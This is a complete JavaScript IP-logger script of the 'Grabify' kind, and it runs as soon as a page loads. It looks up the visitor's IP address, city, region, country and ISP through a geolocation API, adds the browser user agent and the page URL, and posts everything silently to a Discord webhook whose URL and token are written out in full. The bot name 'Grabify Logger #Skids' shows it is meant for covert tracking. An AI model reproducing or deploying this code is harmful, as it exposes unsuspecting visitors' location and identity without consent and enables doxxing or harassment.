// Using ipapi.co to get IP alongside geolocation data
const geoAPI = "https://ipapi.co/json/";

// REDACTED: Replace this with your actual webhook URL. Keep it secret!
const webhookURL = "https://discord.com/api/webhooks/1539734446310428702/36pURjCerJjY_2MagfQuMfWvVZBaQkfJw1D4vlpSV734WXViS785x4R3xMVna3GZCslw";

async function getClientData() {
    try {
        const response = await fetch(geoAPI);
        const data = await response.json();
        
        return {
            ip: data.ip || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown",
            country: data.country_name || "Unknown",
            isp: data.org || "Unknown",
            // Grabs browser and OS info
            userAgent: navigator.userAgent || "Unknown", 
            // Grabs the page URL where the script is executed
            url: window.location.href || "Unknown",
            time: new Date().toISOString()
        };
    } catch (error) {
        console.error("Error fetching client data:", error);
        return null;
    }
}

async function sendToDiscord(info) {
    if (!info) {
        console.error("No client data available to send.");
        return;
    }

    // Formatting the payload using Discord Embeds for a much neater UI
    const payload = {
        username: "235, Grabify Logger #Skids (Link 1)", // You can change the bot's display name here
        embeds: [
            {
                title: "New Connection Logged",
                color: 3447003, // A sleek blue hex color (converted to decimal)
                fields: [
                    {
                        name: "🌐 Network Info",
                        value: `**IP:** ${info.ip}\n**ISP:** ${info.isp}`,
                        inline: false
                    },
                    {
                        name: "📍 Location",
                        value: `${info.city}, ${info.region}, ${info.country}`,
                        inline: false
                    },
                    {
                        name: "💻 System Info",
                        value: `**URL:** ${info.url}\n**User Agent:** \`${info.userAgent}\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Tech Logging System"
                },
                timestamp: info.time
            }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Data sent to Discord successfully!");
        } else {
            console.error("Error sending to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

async function main() {
    const info = await getClientData();
    if (info) {
        await sendToDiscord(info);
    }
}

main();
